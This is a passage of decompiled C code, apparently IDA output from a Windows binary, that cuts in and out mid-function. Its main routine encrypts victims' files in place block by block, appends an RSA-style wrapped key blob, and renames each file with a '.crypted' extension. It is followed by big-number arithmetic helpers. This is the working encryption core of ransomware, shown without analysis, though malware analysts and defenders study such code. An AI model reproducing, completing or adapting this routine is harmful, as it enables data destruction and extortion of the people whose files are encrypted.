  *((_BYTE *)a1 + 56) = *((_BYTE *)a1 + 79);
  sub_401410((int)a1, (int)a1);
  v13 = a1[23];
  *a2 = HIBYTE(a1[20]);
  v8 = a1[25];
  v9 = a1[26];
  a2[4] = HIBYTE(a1[21]);
  v10 = a1[27];
  a2[8] = HIBYTE(a1[22]);
  a2[12] = HIBYTE(a1[23]);
  v11 = a1[24];
  a2[16] = HIBYTE(v11);
  a2[20] = HIBYTE(v8);
  a2[24] = HIBYTE(v9);
  a2[28] = HIBYTE(v10);
  a2[1] = BYTE2(a1[20]);
  a2[5] = BYTE2(a1[21]);
  a2[9] = BYTE2(a1[22]);
  a2[13] = BYTE2(v13);
  a2[17] = BYTE2(v11);
  a2[21] = BYTE2(v8);
  a2[25] = BYTE2(v9);
  a2[29] = BYTE2(v10);
  a2[23] = v8;
  a2[27] = v9;
  a2[31] = v10;
  a2[2] = BYTE1(a1[20]);
  a2[6] = BYTE1(a1[21]);
  a2[10] = BYTE1(a1[22]);
  a2[14] = BYTE1(v13);
  a2[18] = BYTE1(v11);
  a2[22] = BYTE1(v8);
  a2[26] = BYTE1(v9);
  a2[30] = BYTE1(v10);
  a2[3] = a1[20];
  a2[7] = a1[21];
  a2[11] = a1[22];
  a2[15] = a1[23];
  result = a1[24];
  a2[19] = result;
  return result;
}

//----- (004017B0) --------------------------------------------------------
DWORD __stdcall Function(HANDLE *lpThreadParameter)
{
  HANDLE *v1; // esi
  DWORD TickCount; // eax
  int v3; // ecx
  DWORD v4; // eax
  int v5; // edi
  DWORD v6; // edx
  char *v7; // esi
  char v8; // al
  char *v9; // ecx
  __int128 *v10; // esi
  DWORD LowPart; // edi
  char *v12; // eax
  int v13; // esi
  int v14; // edx
  char v15; // cl
  unsigned int v16; // ecx
  unsigned int v17; // edx
  unsigned int v18; // ecx
  HANDLE ProcessHeap; // eax
  HANDLE v20; // eax
  HANDLE v21; // eax
  HANDLE v22; // eax
  __int128 v23; // xmm0
  void *v24; // edi
  int v25; // ecx
  HANDLE v26; // eax
  HANDLE v27; // eax
  HANDLE v28; // eax
  HANDLE v29; // eax
  const WCHAR *v30; // esi
  int v31; // ecx
  char *v32; // eax
  int v33; // ecx
  int *v34; // eax
  int v35; // ecx
  int *v36; // eax
  HANDLE v38; // [esp-14h] [ebp-112F4h]
  int v39; // [esp-14h] [ebp-112F4h]
  HANDLE v40; // [esp-14h] [ebp-112F4h]
  int v41; // [esp-10h] [ebp-112F0h]
  int v42; // [esp-Ch] [ebp-112ECh]
  int v43; // [esp-8h] [ebp-112E8h]
  void *v44; // [esp-4h] [ebp-112E4h]
  void *v45; // [esp-4h] [ebp-112E4h]
  void *v46; // [esp-4h] [ebp-112E4h]
  char v47; // [esp+17h] [ebp-112C9h]
  DWORD v48; // [esp+18h] [ebp-112C8h]
  unsigned __int8 *v49; // [esp+18h] [ebp-112C8h]
  DWORD NumberOfBytesRead; // [esp+1Ch] [ebp-112C4h] BYREF
  LARGE_INTEGER liDistanceToMove; // [esp+20h] [ebp-112C0h]
  LARGE_INTEGER v52; // [esp+28h] [ebp-112B8h]
  int v53; // [esp+30h] [ebp-112B0h]
  unsigned int v54; // [esp+34h] [ebp-112ACh]
  unsigned int HighPart; // [esp+38h] [ebp-112A8h]
  unsigned int v56; // [esp+3Ch] [ebp-112A4h]
  LARGE_INTEGER FileSize; // [esp+40h] [ebp-112A0h] BYREF
  DWORD NumberOfBytesWritten; // [esp+4Ch] [ebp-11294h] BYREF
  __int128 v59; // [esp+50h] [ebp-11290h]
  LPVOID lpMem[2]; // [esp+60h] [ebp-11280h]
  int v61[24]; // [esp+78h] [ebp-11268h] BYREF
  int Buffer[66]; // [esp+D8h] [ebp-11208h] BYREF
  char v63[240]; // [esp+1E0h] [ebp-11100h] BYREF
  __int128 v64; // [esp+2D0h] [ebp-11010h] BYREF
  char v65[4096]; // [esp+2E0h] [ebp-11000h] BYREF
  WCHAR String1[32768]; // [esp+12E0h] [ebp-10000h] BYREF

  v1 = lpThreadParameter;
  v47 = 0;
  GetFileSizeEx(*lpThreadParameter, &FileSize);
  memset(v61, 0, 0x5Cu);
  memset(Buffer, 0, 0x104u);
  SetFilePointerEx(*lpThreadParameter, (LARGE_INTEGER)(FileSize.QuadPart - 260), 0, 0);
  ReadFile(*lpThreadParameter, Buffer, 0x104u, &NumberOfBytesRead, 0);
  if ( Buffer[64] != -1412637478 )
  {
    TickCount = GetTickCount();
    *(LARGE_INTEGER *)&v61[1] = FileSize;
    v61[0] = -1163018018;
    v61[3] = 0;
    v61[4] = 0;
    v61[6] = 5;
    v54 = (134775813 * TickCount + 1) % 0xFFFFFFFF;
    v61[5] = v54;
    sub_4053D0((int)&v61[7], -1);
    sub_4053D0((int)&v61[15], v3);
    sub_401010(v63, &v61[7]);
    v64 = *(_OWORD *)&v61[15];
    liDistanceToMove.QuadPart = 0i64;
    v56 = 0;
    v38 = *lpThreadParameter;
    v52.LowPart = 0;
    SetFilePointerEx(v38, 0i64, 0, 0);
    liDistanceToMove.QuadPart = 0i64;
    ReadFile(*lpThreadParameter, v65, 0x1000u, &NumberOfBytesRead, 0);
    v4 = NumberOfBytesRead;
    v48 = NumberOfBytesRead;
    if ( NumberOfBytesRead )
    {
      v5 = v61[4];
      HighPart = liDistanceToMove.HighPart;
      v52.HighPart = liDistanceToMove.LowPart;
      do
      {
        if ( v4 < 0x1000 )
        {
          v4 = (v4 + 31) & 0xFFFFFFE0;
          v48 = v4;
          NumberOfBytesRead = v4;
        }
        v6 = v4;
        v53 = v5;
        v7 = v65;
        if ( v4 )
        {
          do
          {
            v8 = *v7++;
            v5 = dword_417028[(unsigned __int8)(v8 ^ HIBYTE(v5))] ^ (v5 << 8);
            --v6;
          }
          while ( v6 );
          v4 = v48;
          v53 = v5;
        }
        v61[4] = v5;
        v9 = v65;
        v49 = (unsigned __int8 *)v65;
        v10 = &v64;
        if ( v4 )
        {
          liDistanceToMove.LowPart = ((v4 - 1) >> 4) + 1;
          LowPart = liDistanceToMove.LowPart;
          do
          {
            v12 = v9;
            v13 = (char *)v10 - v9;
            v14 = 16;
            do
            {
              v15 = (v12++)[v13];
              *(v12 - 1) ^= v15;
              --v14;
            }
            while ( v14 );
            sub_4011C0(v49, (int)v63);
            v10 = (__int128 *)v49;
            v9 = (char *)(v49 + 16);
            v49 += 16;
            --LowPart;
          }
          while ( LowPart );
          v5 = v53;
        }
        v64 = *v10;
        SetFilePointerEx(*lpThreadParameter, (LARGE_INTEGER)__PAIR64__(v56, v52.LowPart), 0, 0);
        WriteFile(*lpThreadParameter, v65, NumberOfBytesRead, &NumberOfBytesWritten, 0);
        v16 = v61[6];
        if ( !v61[6] )
          v16 = 1;
        v54 = 134775813 * v54 + 1;
        v17 = v54 % v16 + 1;
        v18 = (v54 % v16 + 1i64 + __PAIR64__(HighPart, v52.HighPart)) >> 32;
        v52.HighPart += v17;
        HighPart = v18;
        v40 = *lpThreadParameter;
        v56 = __PAIR64__(v18, v52.HighPart) >> 20;
        v52.LowPart = v52.HighPart << 12;
        SetFilePointerEx(v40, (LARGE_INTEGER)(__PAIR64__(v18, v52.HighPart) << 12), 0, 0);
        ReadFile(*lpThreadParameter, v65, 0x1000u, &NumberOfBytesRead, 0);
        v4 = NumberOfBytesRead;
        v48 = NumberOfBytesRead;
      }
      while ( NumberOfBytesRead );
    }
    memset(Buffer, 0, 0x104u);
    Buffer[64] = -1412637478;
    ProcessHeap = GetProcessHeap();
    v52.LowPart = (DWORD)HeapAlloc(ProcessHeap, 8u, 4u);
    v20 = GetProcessHeap();
    liDistanceToMove.LowPart = (DWORD)HeapAlloc(v20, 8u, 4u);
    *(_QWORD *)&v59 = 1i64;
    v21 = GetProcessHeap();
    *((_QWORD *)&v59 + 1) = (unsigned int)HeapAlloc(v21, 8u, 4u) | 0x100000000i64;
    lpMem[0] = 0;
    v22 = GetProcessHeap();
    lpMem[1] = HeapAlloc(v22, 8u, 4u);
    sub_404550(v39, v41, v42, v43, (int)&byte_4267E8);
    v23 = v59;
    v24 = lpMem[1];
    lpMem[0] = (LPVOID)1;
    *(_DWORD *)lpMem[1] = 65537;
    sub_4055E0((int)Buffer, (int)v61, v25, v23, *(__int64 *)lpMem);
    v44 = (void *)_mm_cvtsi128_si32(_mm_srli_si128((__m128i)v59, 8));
    v26 = GetProcessHeap();
    HeapFree(v26, 0, v44);
    v27 = GetProcessHeap();
    HeapFree(v27, 0, v24);
    v45 = (void *)liDistanceToMove.LowPart;
    v28 = GetProcessHeap();
    HeapFree(v28, 0, v45);
    v46 = (void *)v52.LowPart;
    v29 = GetProcessHeap();
    HeapFree(v29, 0, v46);
    v1 = lpThreadParameter;
    liDistanceToMove.QuadPart = 0i64;
    SetFilePointerEx(*lpThreadParameter, 0i64, 0, 2u);
    WriteFile(*lpThreadParameter, Buffer, 0x104u, &NumberOfBytesWritten, 0);
    v47 = 1;
  }
  CloseHandle(*v1);
  if ( v47 )
  {
    v30 = (const WCHAR *)(v1 + 1);
    StrRStrIW(v30, 0, L".crypted");
    lstrcpyW(String1, v30);
    lstrcatW(String1, L".crypted");
    MoveFileW(v30, String1);
    v1 = lpThreadParameter;
  }
  sub_4060CB(v1);
  InterlockedExchangeAdd(&Addend, 1);
  v31 = 4096;
  v32 = v65;
  do
  {
    *v32++ = 0;
    --v31;
  }
  while ( v31 );
  v33 = 92;
  v34 = v61;
  do
  {
    *(_BYTE *)v34 = 0;
    v34 = (int *)((char *)v34 + 1);
    --v33;
  }
  while ( v33 );
  v35 = 260;
  v36 = Buffer;
  do
  {
    *(_BYTE *)v36 = 0;
    v36 = (int *)((char *)v36 + 1);
    --v35;
  }
  while ( v35 );
  return 0;
}
// 4018BF: variable 'v3' is possibly undefined
// 401B65: variable 'v39' is possibly undefined
// 401B65: variable 'v41' is possibly undefined
// 401B65: variable 'v42' is possibly undefined
// 401B65: variable 'v43' is possibly undefined
// 401BA3: variable 'v25' is possibly undefined
// 417028: using guessed type int dword_417028[];
// 4267E8: using guessed type char byte_4267E8;

//----- (00401D00) --------------------------------------------------------
LONG sub_401D00()
{
  LONG result; // eax

  for ( result = dword_427424; Addend < dword_427424; result = dword_427424 )
    Sleep(0x1388u);
  return result;
}

//----- (00401D30) --------------------------------------------------------
LPVOID __cdecl sub_401D30(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapAlloc(ProcessHeap, 8u, dwBytes);
}

//----- (00401D50) --------------------------------------------------------
LPVOID __cdecl sub_401D50(LPVOID lpMem, int a2, SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapReAlloc(ProcessHeap, 8u, lpMem, dwBytes);
}

//----- (00401D70) --------------------------------------------------------
BOOL __cdecl sub_401D70(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}

//----- (00401D90) --------------------------------------------------------
unsigned int __fastcall sub_401D90(int a1, int a2, int a3, int *a4, int a5)
{
  int v6; // ecx
  unsigned int result; // eax
  int *v8; // edi
  int v9; // ebx
  int v10; // edx
  unsigned int v11; // esi
  unsigned int v12; // edx
  bool v13; // zf
  int v14; // edi
  int v15; // esi
  int v16; // ebx
  int v17; // edx
  unsigned int v18; // edx
  int v19; // ecx
  bool v20; // cf
  int v21; // [esp+Ch] [ebp-10h]
  int v22; // [esp+10h] [ebp-Ch]
  int v23; // [esp+14h] [ebp-8h]
  int v24; // [esp+18h] [ebp-4h]
  int v25; // [esp+18h] [ebp-4h]

  v24 = a2;
  v6 = a5;
  result = 0;
  v22 = a1;
  if ( a5 > 0 )
  {
    v8 = a4;
    v23 = a5;
    v9 = a2 - (_DWORD)a4;
    v21 = a1 - (_DWORD)a4;
    do
    {
      v10 = *v8++;
      v11 = *(int *)((char *)v8 + v9 - 4);
      v12 = result + v10;
      result = (v11 < v12) + (v12 < result);
      v13 = v23-- == 1;
      *(int *)((char *)v8 + v21 - 4) = v11 - v12;
    }
    while ( !v13 );
    a2 = v24;
    v6 = a5;
    a1 = v22;
  }
  if ( a3 > v6 )
  {
    v14 = 0;
    v15 = a1 + 4 * v6;
    v16 = a3 - v6;
    v17 = a2 - v22;
    v25 = v17;
    do
    {
      v18 = *(_DWORD *)(v17 + v15);
      v15 += 4;
      v19 = v18 - result;
      v20 = v18 < result;
      v17 = v25;
      *(_DWORD *)(v15 - 4) = v19;
      ++v14;
      result = v20;
    }
    while ( v14 < v16 );
  }
  return result;
}

//----- (00401E30) --------------------------------------------------------
int __fastcall sub_401E30(unsigned int *a1, _DWORD *a2, int a3, unsigned int a4)
{
  int v4; // esi
  unsigned int v5; // ebx
  int v6; // ecx
  int v7; // eax
  unsigned int v8; // edi
  unsigned int v9; // edx
  int v10; // esi
  unsigned int v11; // ebx
  int v12; // ecx
  unsigned int v13; // edx
  int result; // eax
  bool v15; // zf
  int v16; // [esp+Ch] [ebp-10h]
  _DWORD *v17; // [esp+10h] [ebp-Ch]
  unsigned int v19; // [esp+18h] [ebp-4h]
  unsigned int v20; // [esp+28h] [ebp+Ch]

  v4 = (unsigned __int16)a4;
  v5 = HIWORD(a4);
  v19 = 0;
  v16 = (unsigned __int16)a4;
  v20 = HIWORD(a4);
  do
  {
    v6 = (unsigned __int16)*a2;
    v7 = HIWORD(*a2);
    v8 = v7 * v4;
    v17 = a2 + 1;
    v9 = v6 * v4;
    v10 = v7 * v5;
    v11 = v8 + v6 * v5 + HIWORD(v9);
    v12 = v10 + 0x10000;
    v13 = v19 + (v11 << 16) + (unsigned __int16)v9;
    if ( v11 >= v8 )
      v12 = v10;
    v4 = v16;
    result = HIWORD(v11) + v12 + (v13 < v19);
    v5 = v20;
    v19 = result;
    *a1 = v13;
    v15 = a3-- == 1;
    a2 = v17;
    ++a1;
  }
  while ( !v15 );
  return result;
}

//----- (00401ED0) --------------------------------------------------------
int __fastcall sub_401ED0(_DWORD *a1, int a2, int a3, unsigned int a4)
{
  int v5; // edx
  _DWORD *v6; // ebx
  unsigned int v7; // edi
  int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // esi
  unsigned int v11; // edx
  int v12; // edi
  unsigned int v13; // ebx
  int v14; // esi
  int v15; // ecx
  int v16; // edi
  unsigned int v17; // edx
  int v18; // eax
  int v19; // ecx
  unsigned int v20; // edi
  int v21; // esi
  unsigned int v22; // edx
  bool v23; // cf
  int v24; // esi
  bool v25; // zf
  int v27; // [esp+Ch] [ebp-14h]
  int v28; // [esp+14h] [ebp-Ch]
  _DWORD *v29; // [esp+18h] [ebp-8h]
  unsigned int v30; // [esp+1Ch] [ebp-4h]
  unsigned int v31; // [esp+2Ch] [ebp+Ch]

  v5 = (unsigned __int16)a4;
  v6 = a1;
  v7 = HIWORD(a4);
  v8 = a2 - (_DWORD)a1;
  v29 = a1;
  v30 = 0;
  v28 = (unsigned __int16)a4;
  v31 = HIWORD(a4);
  v27 = v8;
  do
  {
    v9 = *(_DWORD *)((char *)v6 + v8);
    v10 = v7;
    v11 = (unsigned __int16)v9 * v5;
    v12 = (unsigned __int16)v9 * v7;
    v9 >>= 16;
    v13 = v9 * v28;
    v14 = v9 * v10;
    v15 = v9 * v28 + v12 + HIWORD(v11);
    v16 = (unsigned __int16)v11;
    v17 = v15;
    v18 = v15 << 16;
    v19 = v14 + 0x10000;
    v20 = v30 + v18 + v16;
    if ( v17 >= v13 )
      v19 = v14;
    v8 = v27;
    v21 = HIWORD(v17) + (v20 < v30) + v19;
    v22 = *v29 - v20;
    v7 = v31;
    v23 = *v29 < v22;
    *v29 = v22;
    v5 = v28;
    v6 = v29 + 1;
    v24 = v23 + v21;
    ++v29;
    v25 = a3-- == 1;
    v30 = v24;
  }
  while ( !v25 );
  return v24;
}

//----- (00401F90) --------------------------------------------------------
unsigned int __fastcall sub_401F90(unsigned int *a1, char *a2, int a3, unsigned int *a4, int a5)
{
  int v7; // eax
  int v8; // edx
  unsigned int *v9; // edi
  unsigned int *v10; // esi
  char *v11; // ebx
  unsigned int *v12; // edx
  int v13; // edi
  unsigned int v14; // esi
  unsigned int v15; // eax
  int v16; // ecx
  unsigned int v17; // eax
  unsigned int v18; // ebx
  int v19; // ecx
  int v20; // ecx
  unsigned int v21; // ebx
  bool v22; // cf
  int v23; // ecx
  bool v24; // zf
  int v26; // [esp+Ch] [ebp-20h]
  unsigned int v27; // [esp+14h] [ebp-18h]
  unsigned int v28; // [esp+14h] [ebp-18h]
  unsigned int *v29; // [esp+18h] [ebp-14h]
  int v30; // [esp+1Ch] [ebp-10h]
  unsigned int *v31; // [esp+20h] [ebp-Ch]
  char *v32; // [esp+24h] [ebp-8h]
  unsigned int v33; // [esp+28h] [ebp-4h]
  unsigned int *v34; // [esp+38h] [ebp+Ch]
  int v35; // [esp+3Ch] [ebp+10h]

  v7 = sub_401E30(a1, a2, a3, *a4);
  v8 = a3;
  v9 = a4 + 1;
  v34 = a4 + 1;
  a1[a3] = v7;
  v10 = a1 + 1;
  v29 = v10;
  v35 = a5 - 1;
  if ( v35 >= 1 )
  {
    v11 = (char *)(a2 - (char *)v10);
    v32 = v11;
    do
    {
      v30 = v8;
      v12 = v10;
      v27 = *v9;
      v13 = (unsigned __int16)v27;
      v31 = v10;
      v33 = 0;
      v26 = (unsigned __int16)v27;
      v14 = HIWORD(v27);
      do
      {
        v15 = *(unsigned int *)((char *)v12 + (_DWORD)v11);
        v16 = (unsigned __int16)v15;
        v17 = HIWORD(v15);
        v28 = v17 * v13 + v16 * v14 + ((unsigned int)(v16 * v13) >> 16);
        v18 = v33 + (v28 << 16) + (unsigned __int16)(v16 * v13);
        v19 = v17 * v14 + 0x10000;
        if ( v28 >= v17 * v13 )
          v19 = v17 * v14;
        v13 = v26;
        v20 = HIWORD(v28) + (v18 < v33) + v19;
        v21 = *v31 + v18;
        v22 = v21 < *v31;
        *v31 = v21;
        v11 = v32;
        v12 = v31 + 1;
        v23 = v22 + v20;
        ++v31;
        v24 = v30-- == 1;
        v33 = v23;
      }
      while ( !v24 );
      v11 = v32 - 4;
      v8 = a3;
      v9 = v34 + 1;
      v32 -= 4;
      ++v34;
      v29[a3] = v23;
      v10 = v29 + 1;
      v24 = v35-- == 1;
      ++v29;
    }
    while ( !v24 );
  }
  return v10[v8 - 1];
}

//----- (004020B0) --------------------------------------------------------
int __fastcall sub_4020B0(int a1, int a2, int a3, char a4)
{
  _DWORD *v4; // ebx
  _DWORD *v5; // edi
  int v6; // edx
  int v7; // eax
  unsigned int v8; // esi
  int v10; // [esp+1Ch] [ebp+8h]

  v4 = (_DWORD *)(4 * a3 + a2 - 4);
  v5 = (_DWORD *)(4 * a3 + a1);
  v6 = *v4 >> (32 - a4);
  v7 = *v4 << a4;
  v10 = a3 - 1;
  if ( v10 )
  {
    do
    {
      v8 = *--v4;
      *--v5 = v7 | (v8 >> (32 - a4));
      v7 = v8 << a4;
      --v10;
    }
    while ( v10 );
    *(v5 - 1) = v7;
    return v6;
  }
  else
  {
    *(v5 - 1) = v7;
    return v6;
  }
}

//----- (00402130) --------------------------------------------------------
int __fastcall sub_402130(_DWORD *a1, _DWORD *a2, int a3, char a4)
{
  _DWORD *v4; // edi
  unsigned int *v5; // ebx
  int v6; // esi
  int v7; // eax
  bool v8; // zf
  unsigned int v9; // esi
  int v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+1Ch] [ebp+8h]

  v4 = a1;
  v5 = a2 + 1;
  v6 = *a2 << (32 - a4);
  v7 = *a2 >> a4;
  v8 = a3 == 1;
  v12 = a3 - 1;
  v11 = v6;
  if ( v8 )
  {
    *a1 = v7;
    return v6;
  }
  else
  {
    do
    {
      v9 = *v5++;
      *v4++ = v7 | (v9 << (32 - a4));
      v7 = v9 >> a4;
      --v12;
    }
    while ( v12 );
    *v4 = v7;
    return v11;
  }
}

//----- (004021A0) --------------------------------------------------------
unsigned int __fastcall sub_4021A0(unsigned int a1, unsigned int a2)
{
  unsigned int v3; // edx
  unsigned int v4; // eax
  unsigned int v5; // edi
  unsigned int v6; // edi
  unsigned int v7; // eax
  unsigned int v8; // esi
  int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // edx
  unsigned int v14; // eax
  int v15; // eax
  unsigned int v16; // ecx
  unsigned int v17; // esi
  unsigned int v18; // eax
  unsigned int v19; // edi
  unsigned int v20; // esi
  int v21; // ecx
  unsigned int v22; // ecx
  unsigned int v23; // esi
  BOOL v24; // edx
  unsigned int v26; // [esp+Ch] [ebp-14h]
  unsigned int v28; // [esp+14h] [ebp-Ch]
  int v29; // [esp+18h] [ebp-8h]
  unsigned int v30; // [esp+18h] [ebp-8h]
  unsigned int v31; // [esp+1Ch] [ebp-4h]

  v3 = ~a1 / HIWORD(a1);
  v4 = v3 * (unsigned __int16)a1;
  v5 = ((~a1 - HIWORD(a1) * v3) << 16) | 0xFFFF;
  if ( v5 < v4 )
  {
    v5 += a1;
    --v3;
    if ( v5 >= a1 && v5 < v4 )
    {
      --v3;
      v5 += a1;
    }
  }
  v6 = v5 - v4;
  v7 = v6 + v3 * HIWORD(v6);
  v8 = v7 << 16;
  v29 = HIWORD(v7) + 1;
  v9 = (v6 << 16) - a1 * v29;
  v10 = v9 + 0xFFFF;
  if ( v9 + 0xFFFF >= v7 << 16 )
    v10 = v9 + a1 + 0xFFFF;
  v11 = HIWORD(v7);
  if ( v9 + 0xFFFF < v8 )
    v11 = v29;
  v12 = (v3 << 16) + v11;
  v13 = v12 + 1;
  if ( v10 < a1 )
    v13 = v12;
  v31 = v13;
  if ( !a2 )
    return v13;
  v14 = v10 - a1;
  if ( v10 < a1 )
    v14 = v10;
  v15 = ~v14;
  v16 = v15 + a2;
  v30 = v15 + a2;
  v17 = v15 + a2;
  if ( v15 + a2 < a2 )
  {
    v18 = v17 - a1;
    if ( v17 < a1 )
      v18 = v16;
    v30 = v18 - a1;
    v13 -= 2 - (v17 < a1);
    v31 = v13;
  }
  v19 = HIWORD(a2) * (unsigned __int16)v13;
  v28 = (unsigned __int16)a2 * (unsigned __int16)v13;
  v20 = v19 + (unsigned __int16)a2 * HIWORD(v13) + HIWORD(v28);
  v26 = v20;
  v21 = HIWORD(a2) * HIWORD(v13) + 0x10000;
  if ( v20 >= v19 )
    v21 = HIWORD(a2) * HIWORD(v13);
  v22 = HIWORD(v20) + v21;
  v23 = v22 + v30;
  if ( v22 + v30 >= v22 )
    return v31;
  v24 = v23 == a1 && a2 < (unsigned __int16)v28 + (v26 << 16);
  if ( v23 > a1 )
    v24 = 1;
  return -1 - v24 + v31;
}

//----- (00402310) --------------------------------------------------------
_DWORD *__fastcall sub_402310(_DWORD *a1, int a2)
{
  int v4; // ecx
  int i; // eax
  bool v6; // sf
  unsigned int v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // eax
  unsigned int v10; // edi
  unsigned int v11; // edi
  unsigned int v12; // esi
  unsigned int v13; // ecx
  unsigned int v14; // esi
  int v15; // edi
  unsigned int v16; // edi
  unsigned int v17; // edx
  int v18; // ecx
  _DWORD *result; // eax
  _DWORD *v20; // [esp+Ch] [ebp-Ch]
  unsigned int v21; // [esp+14h] [ebp-4h]

  v4 = 0;
  v20 = a1;
  for ( i = a2; (i & 0xFF000000) == 0; v4 += 8 )
    i <<= 8;
  if ( i >= 0 )
  {
    do
    {
      ++v4;
      v6 = (i & 0x40000000) != 0;
      i *= 2;
    }
    while ( !v6 );
  }
  v7 = a2 << v4;
  *a1 = v4;
  a1[1] = v7;
  v8 = ~v7 / HIWORD(v7);
  v9 = v8 * (unsigned __int16)v7;
  v10 = ((~v7 - HIWORD(v7) * v8) << 16) | 0xFFFF;
  if ( v10 < v9 )
  {
    v10 += v7;
    --v8;
    if ( v10 >= v7 && v10 < v9 )
    {
      --v8;
      v10 += v7;
    }
  }
  v11 = v10 - v9;
  v12 = v11 + v8 * HIWORD(v11);
  v13 = v12 << 16;
  v14 = HIWORD(v12);
  v15 = (v11 << 16) - v7 * (v14 + 1);
  v21 = v15 + 0xFFFF;
  if ( v15 + 0xFFFF < v13 )
    v16 = v15 + 0xFFFF;
  else
    v16 = v7 + v15 + 0xFFFF;
  if ( v21 < v13 )
    ++v14;
  v17 = v8 << 16;
  v18 = v14 + v17 + 1;
  if ( v16 < v7 )
    v18 = v14 + v17;
  result = v20;
  v20[3] = v18;
  return result;
}

//----- (004023F0) --------------------------------------------------------
_DWORD *__fastcall sub_4023F0(_DWORD *a1, int *a2, int a3)
{
  _DWORD *result; // eax
  int v6; // esi
  unsigned int v7; // edx
  int v8; // ebx
  int i; // eax
  bool v10; // sf
  int v11; // ecx
  unsigned int v12; // edx
  int j; // eax

  if ( a3 == 1 )
    return sub_402310(a1, *a2);
  v6 = 0;
  if ( a3 == 2 )
  {
    v7 = *a2;
    v8 = a2[1];
    for ( i = v8; (i & 0xFF000000) == 0; v6 += 8 )
      i <<= 8;
    if ( i >= 0 )
    {
      do
      {
        ++v6;
        v10 = (i & 0x40000000) != 0;
        i *= 2;
      }
      while ( !v10 );
    }
    *a1 = v6;
    if ( v6 )
    {
      v8 = (v7 >> (32 - v6)) | (v8 << v6);
      v7 <<= v6;
    }
    a1[1] = v8;
    a1[2] = v7;
    result = (_DWORD *)sub_4021A0(v8, v7);
    a1[3] = result;
  }
  else
  {
    v11 = a2[a3 - 1];
    v12 = a2[a3 - 2];
    for ( j = v11; (j & 0xFF000000) == 0; v6 += 8 )
      j <<= 8;
    if ( j >= 0 )
    {
      do
      {
        ++v6;
        v10 = (j & 0x40000000) != 0;
        j *= 2;
      }
      while ( !v10 );
    }
    *a1 = v6;
    if ( v6 )
    {
      v11 = (v12 >> (32 - v6)) | (v11 << v6);
      v12 = ((unsigned int)a2[a3 - 3] >> (32 - v6)) | (v12 << v6);
    }
    a1[1] = v11;
    a1[2] = v12;
    result = (_DWORD *)sub_4021A0(v11, v12);
    a1[3] = result;
  }
  return result;
}

//----- (004024F0) --------------------------------------------------------
unsigned int __fastcall sub_4024F0(int a1, char *a2, int a3, int *a4)
{
  int v4; // esi
  int *v5; // edi
  HANDLE ProcessHeap; // eax
  int v7; // eax
  unsigned int v8; // ebx
  unsigned int v9; // eax
  unsigned int v10; // edi
  _DWORD *v11; // eax
  int v12; // edi
  unsigned int v13; // ecx
  int v14; // edx
  unsigned int v15; // ebx
  int v16; // edi
  unsigned int v17; // ecx
  int v18; // edx
  unsigned int v19; // ecx
  int v20; // eax
  int v21; // ecx
  HANDLE v22; // eax
  unsigned int v24; // [esp+Ch] [ebp-28h]
  int v25; // [esp+10h] [ebp-24h]
  int v26; // [esp+14h] [ebp-20h]
  unsigned int v27; // [esp+18h] [ebp-1Ch]
  unsigned int v28; // [esp+1Ch] [ebp-18h]
  char *lpMem; // [esp+20h] [ebp-14h]
  unsigned int v30; // [esp+24h] [ebp-10h]
  unsigned int v31; // [esp+28h] [ebp-Ch]
  _DWORD *v32; // [esp+2Ch] [ebp-8h]
  int v33; // [esp+30h] [ebp-4h]
  char *v34; // [esp+30h] [ebp-4h]
  int v35; // [esp+3Ch] [ebp+8h]

  v4 = a3;
  v5 = a4;
  v33 = (int)a2;
  v26 = a1;
  lpMem = 0;
  if ( *a4 )
  {
    ProcessHeap = GetProcessHeap();
    lpMem = (char *)HeapAlloc(ProcessHeap, 8u, 4 * a3);
    v7 = sub_4020B0((int)lpMem, v33, a3, *a4);
    a2 = lpMem;
    a1 = v26;
    v8 = v7;
  }
  else
  {
    v8 = 0;
  }
  v27 = a4[1];
  v9 = a4[3];
  v30 = v8;
  if ( a3 > 0 )
  {
    v10 = HIWORD(v9);
    v25 = (unsigned __int16)v9;
    v11 = (_DWORD *)(a1 + 4 * a3);
    v31 = v10;
    v34 = &a2[-a1];
    do
    {
      v32 = v11 - 1;
      v12 = HIWORD(v8) * v10;
      v24 = HIWORD(v8) * v25;
      v28 = v24 + (unsigned __int16)v8 * v31 + (((unsigned int)(unsigned __int16)v8 * v25) >> 16);
      v13 = (unsigned __int16)(v8 * v25) + (v28 << 16);
      v14 = v12 + 0x10000;
      v15 = v13 + *(_DWORD *)((char *)v11 + (_DWORD)v34 - 4);
      if ( v28 >= v24 )
        v14 = v12;
      v16 = v14 + v30 + (v15 < v13) + 1 + HIWORD(v28);
      v35 = --v4;
      v17 = *(_DWORD *)((char *)v32 + (_DWORD)v34) - v27 * v16;
      v18 = (__PAIR64__(v16, v15) - v17) >> 32;
      v19 = (v15 < v17 ? v27 : 0) + v17;
      v8 = v19 - v27;
      if ( v19 < v27 )
        v8 = v19;
      v30 = v8;
      if ( v26 )
      {
        v20 = v18 + 1;
        if ( v19 < v27 )
          v20 = v18;
        *v32 = v20;
      }
      v11 = v32;
      v10 = v31;
    }
    while ( v35 > 0 );
    v5 = a4;
  }
  v21 = *v5;
  if ( *v5 )
  {
    v22 = GetProcessHeap();
    HeapFree(v22, 0, lpMem);
    v21 = *v5;
  }
  return v8 >> v21;
}

//----- (00402660) --------------------------------------------------------
int __fastcall sub_402660(char *a1, char *a2, int a3)
{
  char *v3; // esi
  int result; // eax
  int v5; // eax
  char v6; // cl
  bool v7; // sf
  int v8; // edi
  int v9; // ebx
  int v10; // eax
  unsigned int v11; // edx
  int v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+10h] [ebp-Ch]

  v3 = a1;
  result = *(_DWORD *)a2 & 1;
  v12 = result;
  if ( a1 )
  {
    v5 = 2;
    v6 = 0;
    do
    {
      v5 <<= 8;
      v6 += 8;
    }
    while ( (v5 & 0xFF000000) == 0 );
    if ( v5 >= 0 )
    {
      do
      {
        ++v6;
        v7 = (v5 & 0x40000000) != 0;
        v5 *= 2;
      }
